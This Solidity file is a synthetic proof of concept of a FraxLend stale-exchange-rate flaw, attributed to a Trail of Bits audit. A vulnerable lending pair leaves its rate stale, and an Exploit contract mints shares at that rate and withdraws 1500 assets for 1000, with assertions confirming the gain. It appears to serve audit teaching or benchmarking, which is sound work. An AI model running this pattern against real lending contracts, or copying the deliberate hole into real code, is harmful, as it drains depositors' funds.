// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  FraxLend — leveragedPosition leaves exchangeRate stale (Trail of Bits, Frax Q2 2022)
    SYNTHETIC, cheatcode-free reduction.
    Interest raises totalAssets from 1000e18 to 2000e18. leveragedPosition books debt and
    checks solvency against the stored 1e18 rate. It never calls updateExchangeRate.
    Bob then mints against that stale rate and receives 1000 shares instead of 500.
    After the rate is refreshed he withdraws 1500 assets. The control updates the rate
    first, so the same mint is 500 shares and the withdrawal is 1000 assets. */

contract AssetToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        name = "FRAX";
        symbol = "FRAX";
        decimals = 18;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract FraxlendPair {
    uint256 public constant RATE_PRECISION = 1e18;

    AssetToken public asset;
    uint256 public exchangeRate;
    uint256 public lastTimestamp;
    uint256 public totalAssets;
    uint256 public totalShares;
    mapping(address => uint256) public sharesOf;
    mapping(address => uint256) public debt;

    constructor(AssetToken asset_) {
        asset = asset_;
        exchangeRate = RATE_PRECISION;
        lastTimestamp = 0;
    }

    function deposit(uint256 assets) external returns (uint256 shares) {
        require(totalShares == 0, "seeded");
        asset.transferFrom(msg.sender, address(this), assets);
        shares = assets;
        totalAssets = assets;
        totalShares = shares;
        sharesOf[msg.sender] = shares;
        exchangeRate = RATE_PRECISION;
    }

    function accrueInterest(uint256 amount) external {
        asset.mint(address(this), amount);
        totalAssets += amount;
    }

    function updateExchangeRate() public returns (uint256 rate) {
        if (lastTimestamp == block.timestamp) return exchangeRate;
        rate = totalShares == 0 ? RATE_PRECISION : totalAssets * RATE_PRECISION / totalShares;
        exchangeRate = rate;
        lastTimestamp = block.timestamp;
        return rate;
    }

    function _isSolvent(address borrower, uint256 rate) internal view returns (bool) {
        uint256 collateral = sharesOf[borrower] * rate / RATE_PRECISION;
        return collateral >= debt[borrower];
    }

    modifier isSolvent(address borrower) {
        _;
        require(_isSolvent(borrower, exchangeRate), "FraxLendPair: user is insolvent");
    }

    function leveragedPosition(uint256 borrowAssets) external isSolvent(msg.sender) {
        // @> VULN: debt is increased and solvency reads exchangeRate, but updateExchangeRate is never called
        debt[msg.sender] += borrowAssets;
    }

    function mint(uint256 assets) external returns (uint256 shares) {
        shares = assets * RATE_PRECISION / exchangeRate;
        asset.transferFrom(msg.sender, address(this), assets);
        totalAssets += assets;
        totalShares += shares;
        sharesOf[msg.sender] += shares;
    }

    function withdraw(uint256 shares) external returns (uint256 assetsOut) {
        assetsOut = shares * exchangeRate / RATE_PRECISION;
        sharesOf[msg.sender] -= shares;
        totalShares -= shares;
        totalAssets -= assetsOut;
        asset.transfer(msg.sender, assetsOut);
    }

    function fairMint(uint256 assets) external view returns (uint256 shares) {
        shares = assets * totalShares / totalAssets;
    }
}

contract Borrower {
    function seed(FraxlendPair pair, AssetToken asset, uint256 amount) external {
        asset.approve(address(pair), amount);
        pair.deposit(amount);
    }

    function lever(FraxlendPair pair, uint256 borrowAssets) external {
        pair.leveragedPosition(borrowAssets);
    }
}

contract Exploit {
    AssetToken public asset; // nonce 1
    FraxlendPair public pair; // nonce 2
    Borrower public alice; // nonce 3

    uint256 public staleShares;
    uint256 public fairShares;
    uint256 public withdrawn;
    uint256 public rateAfter;

    constructor() {
        asset = new AssetToken();
        pair = new FraxlendPair(asset);
        alice = new Borrower();
        asset.mint(address(alice), 1000 ether);
        asset.mint(address(this), 1000 ether);
        alice.seed(pair, asset, 1000 ether);
    }

    function run() external {
        pair.accrueInterest(1000 ether);
        fairShares = pair.fairMint(1000 ether);
        alice.lever(pair, 100 ether);
        asset.approve(address(pair), 1000 ether);
        staleShares = pair.mint(1000 ether);
        rateAfter = pair.updateExchangeRate();
        withdrawn = pair.withdraw(staleShares);
        require(fairShares == 500 ether, "fair mint");
        require(staleShares == 1000 ether, "stale mint");
        require(withdrawn == 1500 ether, "stale withdraw");
        require(asset.balanceOf(address(this)) == 1500 ether, "bob profit");
        require(pair.totalAssets() == 1500 ether, "alice left short");
        require(pair.sharesOf(address(alice)) == 1000 ether, "alice shares");
    }

    function runControl() external returns (uint256 shares, uint256 assetsOut) {
        pair.accrueInterest(1000 ether);
        pair.updateExchangeRate();
        asset.approve(address(pair), 1000 ether);
        shares = pair.mint(1000 ether);
        assetsOut = pair.withdraw(shares);
    }
}
